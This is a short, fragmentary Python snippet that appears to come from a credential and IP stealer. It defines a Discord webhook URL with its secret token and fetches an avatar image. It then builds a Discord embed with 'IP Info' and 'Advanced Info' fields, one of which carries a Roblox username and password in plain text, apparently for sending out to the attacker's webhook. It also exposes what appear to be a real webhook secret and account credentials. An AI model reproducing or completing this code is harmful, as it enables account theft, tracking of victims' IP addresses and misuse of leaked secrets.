...
webhook = 'https://discordapp.com/api/webhooks/1047587019720765541/N91UCakbEwWc9AnbDnsJL7L3tClIy-qg8D9N07OEU0fUT8W-pHCxe75AwkPSJkb8Ynq4'
bindata = requests.get('https://yt3.googleusercontent.com/KUnfF6likIiVJeuyjVaPZb2IXBXO8QJqpidaeE2jwRDRbGfAv35zuutOk9JympDBLSdfidYZvA=s900-c-k-c0x00ffffff-no-rj').content
  ...
  "embeds": [
    {
      ...
      "fields": [
        {
          "name": "IP Info",
          "value": f"Roblox User: tfvbnm1321  Pass: 01020304",
          "inline": True
        },
        {
          "name": "Advanced Info",
